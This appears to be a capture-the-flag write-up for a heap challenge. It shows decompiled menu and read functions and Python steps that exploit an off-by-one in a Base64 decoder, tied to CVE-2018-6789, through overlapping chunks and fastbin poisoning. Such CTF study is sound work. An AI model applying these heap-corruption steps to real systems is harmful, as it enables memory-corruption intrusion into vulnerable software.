## Problem:

Bin: [d](d)

Libc: [libc-2.23.so](libc-2.23.so)

## Solution:

```c
int nemu_choice()
{
  puts("1. read message");
  puts("2. edit message");
  puts("3. wipe message");
  puts("4. exit");
  return read_int();
}
```

```c
unsigned __int64 Read()
{
  int v1; // [rsp+Ch] [rbp-414h]
  char v2; // [rsp+10h] [rbp-410h]
  unsigned __int64 v3; // [rsp+418h] [rbp-8h]

  v3 = __readfsqword(0x28u);
  v1 = read_int();
  if ( v1 >= 0 && v1 <= 63 && !ptr[v1] )
  {
    printf("msg:");
    read_input((__int64)&v2, 0x400u);
    Base64decode(&v2, &ptr[v1]);
  }
  return __readfsqword(0x28u) ^ v3;
}
```
In case problem is in `Base64decode` . I think this idea comes from `CVE-2018-6789` of `exim4`

From `Base64decode` i will trigger of by one to exploit.

First i create three chunk:
```py
Read(0, b64encode("a"*0x20))
Read(1, b64encode("a"*0x20))
Read(2, b64encode("a"*0x60))
```
Next i `free()` `chunk 0` and allocate it again and overwrite size of `chunk 1` to fake `chunk 1` overlap `chunk 2`
```py
Read(0, b64encode("\x60"*0x29)[:-1]) #over next chunk size
```

Edit chunk 2 to set next chunk size of `fake chunk 1`
```py
payload = "a"*0x28
payload += p64(0x71)
Edit(2, payload)
```

`Free(1)` and `Free(2)` to create fastbins `0x60` and `0x70`
Create chunk size `0x60` to fake one more fastbins `0x70`to bss.

And more please see more in my solution: [exploit.py](exploit.py)